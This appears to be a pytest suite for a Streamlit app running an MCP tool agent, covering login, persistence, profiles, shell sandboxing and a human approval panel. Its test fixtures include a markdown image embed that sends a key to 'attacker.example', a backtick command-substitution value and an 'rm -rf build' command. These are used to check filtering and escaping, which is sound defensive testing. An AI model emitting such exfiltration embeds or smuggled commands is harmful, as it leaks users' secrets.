"""End-to-end script runs via Streamlit's own test harness.

These catch the class of breakage that unit tests miss: import errors, widget
misuse, and exceptions raised during a real script run.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from streamlit.testing.v1 import AppTest

from mcp_agent.state import SESSION_KEY

APP = str(Path(__file__).parent.parent / "app.py")
TIMEOUT = 30


def run_app(monkeypatch, **env: str) -> AppTest:
    for key in ("USE_LOGIN", "USER_ID", "USER_PASSWORD", "MCP_ALLOW_TOOL_EDIT"):
        monkeypatch.delenv(key, raising=False)
    for key, value in env.items():
        monkeypatch.setenv(key, value)
    return AppTest.from_file(APP, default_timeout=TIMEOUT).run()


@pytest.fixture(autouse=True)
def _isolated(tmp_path, monkeypatch):
    import streamlit as st

    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("MCP_CONFIG_PATH", str(tmp_path / "config.json"))
    monkeypatch.setenv("ANTHROPIC_API_KEY", "test-key-not-real")

    # `st.cache_resource` outlives an AppTest run, so the checkpointer one test
    # opened would be handed to the next one — pointing at the previous test's
    # database. That is right in production, where the process opens one
    # checkpointer and the environment does not change under it, and wrong here.
    # Clearing it is also what makes "restart" mean restart.
    st.cache_resource.clear()


def test_app_runs_without_exception(monkeypatch):
    app = run_app(monkeypatch)
    assert not app.exception


def test_uninitialized_agent_is_announced(monkeypatch):
    app = run_app(monkeypatch)
    assert any("not initialized" in info.value for info in app.info)


def test_model_selector_offers_registry_models(monkeypatch):
    from mcp_agent.models import MODEL_REGISTRY

    app = run_app(monkeypatch)
    assert list(app.sidebar.selectbox[0].options) == list(MODEL_REGISTRY)


def test_missing_api_key_warns_instead_of_crashing(monkeypatch):
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    app = run_app(monkeypatch)
    assert not app.exception
    assert any("No API key" in warning.value for warning in app.warning)


def test_tool_editor_is_hidden_by_default(monkeypatch):
    app = run_app(monkeypatch)
    assert not app.exception
    assert any("tool editing is disabled" in info.value for info in app.info)


def test_tool_editor_appears_when_explicitly_enabled(monkeypatch):
    app = run_app(monkeypatch, MCP_ALLOW_TOOL_EDIT="true")
    assert not app.exception
    assert not any("tool editing is disabled" in info.value for info in app.info)


def test_login_gate_blocks_when_enabled(monkeypatch):
    app = run_app(
        monkeypatch, USE_LOGIN="true", USER_ID="alice", USER_PASSWORD="fake-password-for-tests"
    )
    assert not app.exception
    assert any("Login" in heading.value for heading in app.title)
    assert not app.chat_input


def test_blank_login_is_refused(monkeypatch):
    app = run_app(
        monkeypatch, USE_LOGIN="true", USER_ID="alice", USER_PASSWORD="fake-password-for-tests"
    )
    app.button[0].click().run()
    assert any("incorrect" in error.value for error in app.error)


def test_correct_login_reveals_the_app(monkeypatch):
    app = run_app(
        monkeypatch, USE_LOGIN="true", USER_ID="alice", USER_PASSWORD="fake-password-for-tests"
    )
    app.text_input[0].set_value("alice")
    app.text_input[1].set_value("fake-password-for-tests")
    app.button[0].click().run()
    assert not app.exception
    assert app.chat_input


def test_login_with_unset_credentials_reports_misconfiguration(monkeypatch):
    """Compose's ${USER_ID:-} turns unset into "", which used to let anyone in."""
    app = run_app(monkeypatch, USE_LOGIN="true", USER_ID="", USER_PASSWORD="")
    assert not app.exception
    assert any("USE_LOGIN is enabled" in error.value for error in app.error)
    # Fails closed: no login form is offered at all, so nothing can be submitted.
    assert not app.button
    assert not app.chat_input


def test_corrupt_config_surfaces_an_error_without_crashing(monkeypatch, tmp_path):
    (tmp_path / "config.json").write_text('{"broken": ,}', encoding="utf-8")
    app = run_app(monkeypatch)
    assert not app.exception
    assert any("not valid JSON" in error.value for error in app.error)


def test_usage_panel_renders_real_numbers(monkeypatch):
    """The metric branch was previously unreachable in tests."""
    from mcp_agent.state import SESSION_KEY, AppState
    from mcp_agent.usage import TokenUsage

    app = AppTest.from_file(APP, default_timeout=TIMEOUT)
    app.session_state[SESSION_KEY] = AppState(
        prefix_tokens=5000,  # above every model's floor, so no warning
        usage=TokenUsage(input_tokens=1000, output_tokens=50, cache_read=900),
    )
    app.run()

    assert not app.exception
    labels = {m.label: m.value for m in app.sidebar.metric}
    assert labels["Cache hit rate"] == "90.0%"
    assert labels["Input (billed)"] == "100"


def test_short_prefix_is_reported_as_the_reason_caching_is_off(monkeypatch):
    """A prefix under the model floor must not be blamed on prefix instability."""
    from mcp_agent.state import SESSION_KEY, AppState
    from mcp_agent.usage import TokenUsage

    app = AppTest.from_file(APP, default_timeout=TIMEOUT)
    app.session_state[SESSION_KEY] = AppState(
        selected_model="claude-haiku-4-5-20251001",
        prefix_tokens=487,
        usage=TokenUsage(input_tokens=1000, output_tokens=50),
    )
    app.run()

    assert not app.exception
    assert any("Caching is inactive" in w.value for w in app.warning)


def test_effort_slider_appears_only_where_the_model_accepts_it(monkeypatch):
    from mcp_agent.state import SESSION_KEY, AppState

    supported = AppTest.from_file(APP, default_timeout=TIMEOUT)
    supported.session_state[SESSION_KEY] = AppState(selected_model="claude-opus-5")
    supported.run()
    assert not supported.exception
    assert [s.label for s in supported.sidebar.select_slider] == ["🎚️ Effort"]

    unsupported = AppTest.from_file(APP, default_timeout=TIMEOUT)
    unsupported.session_state[SESSION_KEY] = AppState(selected_model="claude-haiku-4-5-20251001")
    unsupported.run()
    assert not unsupported.exception
    assert not unsupported.sidebar.select_slider
    assert any("Effort is not supported" in c.value for c in unsupported.sidebar.caption)


def _apply_settings(app):
    """Click Apply Settings, whichever button index it happens to be."""
    for button in app.button:
        if button.label == "Apply Settings":
            return button.click().run()
    raise AssertionError("Apply Settings button not found")


def test_editing_the_config_file_survives_apply_settings(monkeypatch, tmp_path):
    """A hand edit to config.json must not be overwritten by Apply Settings.

    With the in-app editor off — the default — editing the file is the only
    supported way to add a tool. The config is read from disk once per browser
    session, so applying settings used to write that stale copy back over the
    edit, leaving the file as `{}` and no tool registered. Found by driving the
    real script; the failure was silent.
    """
    import json

    config = tmp_path / "config.json"
    app = run_app(monkeypatch)
    assert not app.exception

    config.write_text(
        json.dumps({"time": {"command": "python", "args": ["./x.py"], "transport": "stdio"}}),
        encoding="utf-8",
    )

    _apply_settings(app)

    on_disk = json.loads(config.read_text(encoding="utf-8"))
    assert "time" in on_disk, f"the hand edit was overwritten; file is now {on_disk}"


def test_applying_settings_without_an_edit_does_not_create_a_config(monkeypatch, tmp_path):
    """No edit, no file. Applying settings is not a reason to write one."""
    config = tmp_path / "config.json"
    app = run_app(monkeypatch)
    _apply_settings(app)
    assert not config.exists()


def test_a_failing_mcp_server_is_named_in_the_sidebar(monkeypatch, tmp_path):
    """A server that will not start must say so, not just lower the tool count.

    The pool skips a broken server rather than failing the whole run. Without
    this rendering, the only symptom a user sees is a tool count quietly lower
    than expected, with the reason in a log they are not reading.
    """
    import json

    (tmp_path / "config.json").write_text(
        json.dumps(
            {
                "broken": {
                    "command": "python",
                    "args": [str(tmp_path / "no-such-server.py")],
                    "transport": "stdio",
                }
            }
        ),
        encoding="utf-8",
    )

    app = _apply_settings(run_app(monkeypatch))
    assert not app.exception
    assert any("broken" in warning.value for warning in app.warning), (
        f"no warning named the failing server; warnings were {[w.value for w in app.warning]}"
    )


def _thread_param(app) -> str:
    """AppTest hands query params back as lists; a browser gives a string."""
    value = app.query_params.get("thread")
    if isinstance(value, list):
        return value[0] if value else ""
    return value or ""


def test_the_thread_id_is_published_to_the_url(monkeypatch):
    """A durable checkpointer is useless if the key it is stored under is not.

    Without this, every browser session generates a fresh UUID, so the restored
    conversation is written and then never asked for again.
    """
    app = run_app(monkeypatch)
    assert not app.exception
    assert _thread_param(app), "no thread id in the URL"


def test_a_thread_id_in_the_url_is_adopted(monkeypatch):
    """Reload, bookmark, or a second tab. The URL decides the conversation."""
    app = AppTest.from_file(APP, default_timeout=TIMEOUT)
    app.query_params["thread"] = "a-known-thread"
    app.run()
    assert not app.exception
    assert _thread_param(app) == "a-known-thread"


def test_resetting_moves_the_url_to_the_new_conversation(monkeypatch):
    """Leaving the old id would send the next reload back into what was reset."""
    app = run_app(monkeypatch)
    before = _thread_param(app)

    for button in app.button:
        if button.label == "Reset Conversation":
            app = button.click().run()
            break
    else:
        raise AssertionError("Reset Conversation button not found")

    assert _thread_param(app) != before


def test_the_url_thread_id_becomes_the_session_thread_id(monkeypatch):
    """Observes the mechanism, not just the URL.

    Asserting only that the URL still holds the id passes even if nothing reads
    it — verified: replacing the assignment with `pass` left the suite green.
    The id has to reach the state the agent is actually invoked with.
    """
    from mcp_agent.state import SESSION_KEY

    app = AppTest.from_file(APP, default_timeout=TIMEOUT)
    app.query_params["thread"] = "a-known-thread"
    app.run()

    assert not app.exception
    assert app.session_state[SESSION_KEY].thread_id == "a-known-thread"


def test_a_stored_conversation_is_replayed_after_a_restart(monkeypatch, tmp_path):
    """The end-to-end promise: close the process, come back, see the transcript.

    A fresh script run is exactly what a restart looks like to Streamlit — no
    session state, only the URL. If the transcript does not come back here, the
    checkpointer is storing conversations nobody can reach.
    """
    import asyncio

    from langchain_core.messages import AIMessage, HumanMessage
    from langchain_core.runnables import RunnableConfig

    db = tmp_path / "restored.db"
    monkeypatch.setenv("CHECKPOINT_DB_PATH", str(db))

    async def seed() -> None:
        import aiosqlite
        from langgraph.checkpoint.sqlite.aio import AsyncSqliteSaver

        connection = await aiosqlite.connect(str(db))
        saver = AsyncSqliteSaver(connection)
        await saver.setup()
        await saver.aput(
            RunnableConfig(configurable={"thread_id": "earlier-run", "checkpoint_ns": ""}),
            {
                "v": 1,
                "id": "checkpoint-1",
                "ts": "2026-09-07T00:00:00+00:00",
                "channel_values": {
                    "messages": [
                        HumanMessage(content="remember this"),
                        AIMessage(content="Noted."),
                    ]
                },
                "channel_versions": {"messages": 1},
                "versions_seen": {},
            },
            {"source": "loop", "step": 1, "parents": {}},
            {"messages": 1},
        )
        await connection.close()

    asyncio.run(seed())

    app = AppTest.from_file(APP, default_timeout=TIMEOUT)
    app.query_params["thread"] = "earlier-run"
    app.run()

    assert not app.exception
    rendered = " ".join(block.value for block in app.markdown)
    assert "remember this" in rendered
    assert "Noted." in rendered


def test_resetting_deletes_the_conversation_from_storage(monkeypatch, tmp_path):
    """The reset button has to reach the database, not just the URL.

    Rotating the thread id alone was fine while the store was in memory. With a
    durable one it leaves rows the application offers no way to reach or remove
    — a file that only grows, holding conversations the user thinks they
    discarded.
    """
    import asyncio

    from langchain_core.messages import AIMessage, HumanMessage
    from langchain_core.runnables import RunnableConfig

    from mcp_agent.checkpoints import load_history

    db = tmp_path / "reset.db"
    monkeypatch.setenv("CHECKPOINT_DB_PATH", str(db))

    async def with_saver(fn):
        import aiosqlite
        from langgraph.checkpoint.sqlite.aio import AsyncSqliteSaver

        connection = await aiosqlite.connect(str(db))
        saver = AsyncSqliteSaver(connection)
        await saver.setup()
        try:
            return await fn(saver)
        finally:
            await connection.close()

    async def seed(saver):
        await saver.aput(
            RunnableConfig(configurable={"thread_id": "doomed", "checkpoint_ns": ""}),
            {
                "v": 1,
                "id": "checkpoint-1",
                "ts": "2026-09-07T00:00:00+00:00",
                "channel_values": {
                    "messages": [HumanMessage(content="forget this"), AIMessage(content="Sure.")]
                },
                "channel_versions": {"messages": 1},
                "versions_seen": {},
            },
            {"source": "loop", "step": 1, "parents": {}},
            {"messages": 1},
        )

    asyncio.run(with_saver(seed))
    assert asyncio.run(with_saver(lambda s: load_history(s, "doomed")))  # precondition

    app = AppTest.from_file(APP, default_timeout=TIMEOUT)
    app.query_params["thread"] = "doomed"
    app.run()
    assert not app.exception

    for button in app.button:
        if button.label == "Reset Conversation":
            app = button.click().run()
            break
    else:
        raise AssertionError("Reset Conversation button not found")

    assert not app.exception
    assert _thread_param(app) != "doomed"
    assert asyncio.run(with_saver(lambda s: load_history(s, "doomed"))) == []


# --- The two timeouts have to be ordered ---------------------------------------


def test_a_tool_allowed_to_outlive_the_turn_is_flagged(monkeypatch):
    """Their defaults meet exactly at the slider's minimum.

    `MCP_TOOL_TIMEOUT` defaults to 60s and the turn slider's floor is 60s, so a
    user who drags it down reaches a state the documentation tells them to
    avoid, with nothing saying they have arrived. A tool still running at the
    turn deadline leaves the thread checkpointed with a tool call and no
    result, which Anthropic rejects on every later turn.
    """
    from mcp_agent.state import SESSION_KEY

    monkeypatch.setenv("MCP_TOOL_TIMEOUT", "120")

    app = AppTest.from_file(APP, default_timeout=TIMEOUT).run()
    app.session_state[SESSION_KEY].timeout_seconds = 60
    app.run()

    assert any("unusable until it is reset" in warning.value for warning in app.warning), [
        w.value for w in app.warning
    ]


def test_no_warning_when_the_tool_bound_expires_first(monkeypatch):
    from mcp_agent.state import SESSION_KEY

    monkeypatch.setenv("MCP_TOOL_TIMEOUT", "30")

    app = AppTest.from_file(APP, default_timeout=TIMEOUT).run()
    app.session_state[SESSION_KEY].timeout_seconds = 120
    app.run()

    assert not any("unusable until it is reset" in warning.value for warning in app.warning)


# --- Profiles reach the agent --------------------------------------------------


def _with_profiles(tmp_path, monkeypatch, payload: dict) -> None:
    import json

    path = tmp_path / "profiles.json"
    path.write_text(json.dumps(payload), encoding="utf-8")
    monkeypatch.setenv("MCP_PROFILES_PATH", str(path))


def test_no_profiles_file_shows_no_selector(monkeypatch, tmp_path):
    """One profile is not a choice, and a menu of one is noise."""
    monkeypatch.setenv("MCP_PROFILES_PATH", str(tmp_path / "absent.json"))

    app = run_app(monkeypatch)

    assert not app.exception
    assert not any("Profile" in box.label for box in app.selectbox), [
        b.label for b in app.selectbox
    ]


def test_profiles_are_offered_and_described(monkeypatch, tmp_path):
    _with_profiles(
        tmp_path,
        monkeypatch,
        {
            "general": {"description": "Everything, no shell."},
            "research": {"description": "Search and read.", "mcp_servers": []},
        },
    )

    app = run_app(monkeypatch)

    assert not app.exception
    chooser = [box for box in app.selectbox if "Profile" in box.label]
    assert chooser, [b.label for b in app.selectbox]
    assert chooser[0].options == ["general", "research"]
    assert any("Everything, no shell." in caption.value for caption in app.caption)


def test_a_broken_profiles_file_is_reported_and_survivable(monkeypatch, tmp_path):
    """A typo in a hand-written file must not take the page down."""
    path = tmp_path / "profiles.json"
    path.write_text('{"general": }', encoding="utf-8")
    monkeypatch.setenv("MCP_PROFILES_PATH", str(path))

    app = run_app(monkeypatch)

    assert not app.exception
    assert any("not valid JSON" in error.value for error in app.error), [e.value for e in app.error]


def test_a_profile_narrows_which_servers_are_opened(monkeypatch, tmp_path):
    """The whole point of naming servers, and nothing else observes it.

    Everything else about a profile is visible in the sidebar; this is not.
    Measured with a mutation: replacing the profile's selection with the whole
    configuration left every other test in this file green, so a profile could
    silently open servers it was written to exclude.
    """
    import json

    from mcp_agent.state import SESSION_KEY

    (tmp_path / "config.json").write_text(
        json.dumps(
            {
                "git": {"command": "python", "args": ["-c", ""], "transport": "stdio"},
                "search": {"command": "python", "args": ["-c", ""], "transport": "stdio"},
            }
        ),
        encoding="utf-8",
    )
    _with_profiles(
        tmp_path,
        monkeypatch,
        {
            "general": {"description": "Everything."},
            "repository": {"description": "Just git.", "mcp_servers": ["git"]},
        },
    )

    opened: list[dict] = []

    async def spy(mcp_config):
        opened.append(dict(mcp_config))
        return []

    monkeypatch.setattr("mcp_agent.agent.discover_tools", spy)

    app = AppTest.from_file(APP, default_timeout=TIMEOUT).run()
    app.session_state[SESSION_KEY].selected_profile = "repository"
    app.run()
    [button for button in app.button if button.label == "Apply Settings"][0].click().run()

    assert not app.exception
    assert opened, "Apply Settings never reached tool discovery"
    assert list(opened[-1]) == ["git"], opened[-1]


def test_the_selected_profile_reaches_the_agent(monkeypatch, tmp_path):
    """The `app.py` -> `build_agent` hop, which nothing else observes.

    Measured: dropping the profile at the call site left every other test
    green, so the sidebar would name a profile while the agent was built from
    the default — no ceilings, and none of the profile's own prompt.
    """
    import json

    from mcp_agent.agent import AgentBundle
    from mcp_agent.state import SESSION_KEY

    (tmp_path / "config.json").write_text(json.dumps({}), encoding="utf-8")
    _with_profiles(
        tmp_path,
        monkeypatch,
        {
            "general": {"description": "Everything."},
            "repository": {
                "description": "Just git.",
                "system_prompt": "You are in a git repository.",
                "limits": {"tool_calls_per_run": 7},
            },
        },
    )

    built: list = []

    async def spy(model_id, tools, checkpointer, effort=None, profile=None):
        built.append(profile)
        return AgentBundle(agent=object(), tool_count=0, estimated_prefix_tokens=0)

    monkeypatch.setattr("mcp_agent.agent.build_agent", spy)

    app = AppTest.from_file(APP, default_timeout=TIMEOUT).run()
    app.session_state[SESSION_KEY].selected_profile = "repository"
    app.run()
    [button for button in app.button if button.label == "Apply Settings"][0].click().run()

    assert not app.exception
    assert built, "Apply Settings never reached build_agent"
    assert built[-1] is not None, "build_agent was called without a profile"
    assert built[-1].name == "repository", built[-1]
    assert built[-1].limits.tool_calls_per_run == 7


# --- The sidebar tells the truth about the shell --------------------------------


def test_a_profile_wanting_a_shell_without_the_operator_switch_says_so(monkeypatch, tmp_path):
    monkeypatch.delenv("MCP_ENABLE_SHELL", raising=False)
    _with_profiles(
        tmp_path,
        monkeypatch,
        {
            "general": {"description": "Everything."},
            "repository": {
                "description": "Just git.",
                "shell": {"enabled": True, "allow": ["git", "ls"]},
            },
        },
    )

    app = run_app(monkeypatch)
    app.session_state[SESSION_KEY].selected_profile = "repository"
    app = app.run()

    assert any("MCP_ENABLE_SHELL" in info.value for info in app.info), [i.value for i in app.info]


def test_a_sandboxed_shell_says_what_it_may_run(monkeypatch, tmp_path):
    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")
    monkeypatch.delenv("MCP_SHELL_POLICY", raising=False)
    _with_profiles(
        tmp_path,
        monkeypatch,
        {
            "general": {"description": "Everything."},
            "repository": {
                "description": "Just git.",
                "shell": {"enabled": True, "allow": ["git", "ls"]},
            },
        },
    )

    app = run_app(monkeypatch)
    app.session_state[SESSION_KEY].selected_profile = "repository"
    app = app.run()

    captions = " ".join(caption.value for caption in app.caption)
    assert "sandboxed with no network" in captions, captions
    assert "git, ls" in captions


def test_a_host_shell_is_an_error_not_a_caption(monkeypatch, tmp_path):
    """The one configuration where the page must not be reassuring.

    Commands run as the process serving the page. A caption reads as
    reassurance; this has to read as a warning, because it is one.
    """
    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")
    monkeypatch.setenv("MCP_SHELL_POLICY", "host")
    _with_profiles(
        tmp_path,
        monkeypatch,
        {
            "general": {"description": "Everything."},
            "unsafe": {
                "description": "Runs on the host.",
                "shell": {"enabled": True, "policy": "host", "allow": ["ls"]},
            },
        },
    )

    app = run_app(monkeypatch)
    app.session_state[SESSION_KEY].selected_profile = "unsafe"
    app = app.run()

    errors = " ".join(error.value for error in app.error)
    assert "on this host" in errors, errors


# --- The approval panel ---------------------------------------------------------


def _stop_for_approval(app, command: str = "git push origin main"):
    """Put the session in the state a stopped command leaves behind."""
    from mcp_agent.approvals import PendingApproval, StoppedAction

    app.session_state[SESSION_KEY].pending_approval = PendingApproval(
        actions=(StoppedAction(tool_name="shell", command=command, args={"command": command}),)
    )
    return app.run()


def test_a_stopped_command_is_shown_verbatim(monkeypatch):
    app = _stop_for_approval(run_app(monkeypatch))

    assert not app.exception
    assert any("git push origin main" in block.value for block in app.code), [
        c.value for c in app.code
    ]
    assert any("needs your approval" in warning.value for warning in app.warning)


def test_the_command_is_shown_as_code_never_as_markdown(monkeypatch):
    """It is model output. A literal fence in it must not escape into the page."""
    app = _stop_for_approval(run_app(monkeypatch), command="git push `id`")

    assert any("git push `id`" in block.value for block in app.code)
    assert not any("git push `id`" in block.value for block in app.markdown)


def test_both_decisions_are_offered(monkeypatch):
    app = _stop_for_approval(run_app(monkeypatch))

    labels = [button.label for button in app.button]
    assert any("Approve" in label for label in labels), labels
    assert any("Reject" in label for label in labels), labels


def test_the_chat_input_is_locked_while_a_decision_is_pending(monkeypatch):
    """The graph is interrupted mid-turn.

    A new message would append to a thread whose last tool call has no result,
    which is the invalid sequence every other bound in this project exists to
    avoid.
    """
    app = _stop_for_approval(run_app(monkeypatch))

    assert app.chat_input[0].disabled is True


def test_the_chat_input_is_open_when_nothing_is_pending(monkeypatch):
    app = run_app(monkeypatch)
    assert app.chat_input[0].disabled is False


class _FinishedTurn:
    """A turn that streams nothing and reports `result`."""

    def __init__(self, result):
        self._result = result

    def __iter__(self):
        return iter(())

    @property
    def result(self):
        return self._result


def _spy_resume(monkeypatch, outcome=None, *, explode=False):
    """Install a Turn whose `resuming` records how it was called."""
    import mcp_agent.turns as turns
    from mcp_agent.agent import QueryResult

    seen: dict = {}

    class SpyTurn(turns.Turn):
        @classmethod
        def resuming(cls, agent, decision, **kwargs):
            seen["decision"] = decision
            seen.update(kwargs)
            if explode:
                raise RuntimeError("the loop went away")
            return _FinishedTurn(outcome if outcome is not None else QueryResult(text="Done."))

    monkeypatch.setattr("mcp_agent.turns.Turn", SpyTurn)
    return seen


def _click(app, label: str):
    return [button for button in app.button if label in button.label][0].click().run()


def test_approving_resumes_the_same_conversation(monkeypatch):
    """A decision continues the interrupted turn; it is not a new question.

    Measured: replacing `Turn.resuming` with a fresh `Turn` left every other
    test green, and would have sent the literal decision dict to the model as
    a user message while the stopped command sat in the checkpoint forever.
    """
    seen = _spy_resume(monkeypatch)
    app = _stop_for_approval(run_app(monkeypatch))
    thread = app.session_state[SESSION_KEY].thread_id

    app = _click(app, "Approve")

    assert not app.exception
    assert seen.get("decision") == {"type": "approve"}
    assert seen.get("thread_id") == thread, "the resume went to a different conversation"


def test_rejecting_sends_a_rejection(monkeypatch):
    seen = _spy_resume(monkeypatch)
    app = _stop_for_approval(run_app(monkeypatch))

    app = _click(app, "Reject")

    assert seen.get("decision", {}).get("type") == "reject"
    assert seen["decision"]["message"], "a rejection with no reason tells the model nothing"


def test_a_finished_resume_clears_the_pending_command(monkeypatch):
    _spy_resume(monkeypatch)
    app = _stop_for_approval(run_app(monkeypatch))

    app = _click(app, "Approve")

    assert app.session_state[SESSION_KEY].pending_approval is None
    assert app.chat_input[0].disabled is False


def test_a_resume_that_fails_leaves_the_decision_on_offer(monkeypatch):
    """The graph is still interrupted, so the decision is still the right one.

    Clearing on the click instead would strand it: nothing in the page could
    resume the turn, and the conversation would be stuck with a tool call that
    has no result.
    """
    _spy_resume(monkeypatch, explode=True)
    app = _stop_for_approval(run_app(monkeypatch))

    app = _click(app, "Approve")

    assert app.session_state[SESSION_KEY].pending_approval is not None
    assert not app.exception, [str(e) for e in app.exception]


def test_replayed_answers_do_not_fetch_images(monkeypatch):
    """A transcript is redrawn on every rerun, so an embed fetches every time.

    Measured: filtering the streaming path but not the replay left every other
    test green, and the replay is the path that repeats.
    """
    app = run_app(monkeypatch)
    app.session_state[SESSION_KEY].history = [
        {"role": "user", "content": "summarise that page"},
        {
            "role": "assistant",
            "content": "Done. ![](https://attacker.example/?k=sk-ant-leak)",
            "tool_log": "",
        },
    ]
    app = app.run()

    drawn = " ".join(block.value for block in app.markdown)
    assert "attacker.example" not in drawn, drawn
    assert "Done." in drawn


def _stop_for_two(app, first="git push", second="rm -rf build"):
    from mcp_agent.approvals import PendingApproval, StoppedAction

    app.session_state[SESSION_KEY].pending_approval = PendingApproval(
        actions=(
            StoppedAction("shell", first, {"command": first}),
            StoppedAction("shell", second, {"command": second}),
        )
    )
    return app.run()


def test_both_stopped_commands_are_shown(monkeypatch):
    """A model can call two tools in one message, and one interrupt carries both.

    Showing one and hiding the other asks someone to decide about something
    they cannot see. Measured: rendering only the first left the suite green.
    """
    app = _stop_for_two(run_app(monkeypatch))

    shown = [block.value for block in app.code]
    assert "git push" in shown and "rm -rf build" in shown, shown
    assert any("2 commands" in warning.value for warning in app.warning)


def test_the_whole_interrupt_is_handed_to_the_resume(monkeypatch):
    """The middleware counts the decisions it gets back.

    Measured: dropping `pending=` from the call left the suite green, and the
    resume would raise on any two-action interrupt — wedging the thread while
    the page cleared the approval over a graph that could not advance.
    """
    seen = _spy_resume(monkeypatch)
    app = _stop_for_two(run_app(monkeypatch))

    app = _click(app, "Approve")

    assert seen.get("pending") is not None, "the resume was given no interrupt to answer"
    assert len(seen["pending"]) == 2


def test_a_resume_that_fails_reports_it_rather_than_crashing(monkeypatch):
    """The earlier version of this test asserted only that the decision stayed.

    It passed while the page ended in an uncaught traceback — it was the one
    case in this file that never asserted `not app.exception`, which is how it
    concealed that the call site had no error handling at all.
    """
    _spy_resume(monkeypatch, explode=True)
    app = _stop_for_approval(run_app(monkeypatch))

    app = _click(app, "Approve")

    assert not app.exception, [str(e) for e in app.exception]
    assert app.session_state[SESSION_KEY].pending_approval is not None
    assert any("still waiting" in error.value for error in app.error), [e.value for e in app.error]


def test_the_question_reaches_the_transcript(monkeypatch):
    """`record` is given the query, so the conversation shows what was asked."""
    import mcp_agent.turns as turns
    from mcp_agent.agent import QueryResult

    class SpyTurn(turns.Turn):
        def __init__(self, agent, query, **kwargs):
            self._done = QueryResult(text="Half past four.")

        def __iter__(self):
            return iter(())

        @property
        def result(self):
            return self._done

    monkeypatch.setattr("mcp_agent.turns.Turn", SpyTurn)

    app = AppTest.from_file(APP, default_timeout=TIMEOUT).run()
    app.session_state[SESSION_KEY].session_initialized = True
    app.session_state[SESSION_KEY].agent = object()
    app.run()
    app = app.chat_input[0].set_value("what time is it").run()

    history = app.session_state[SESSION_KEY].history
    assert {"role": "user", "content": "what time is it"} in history, history
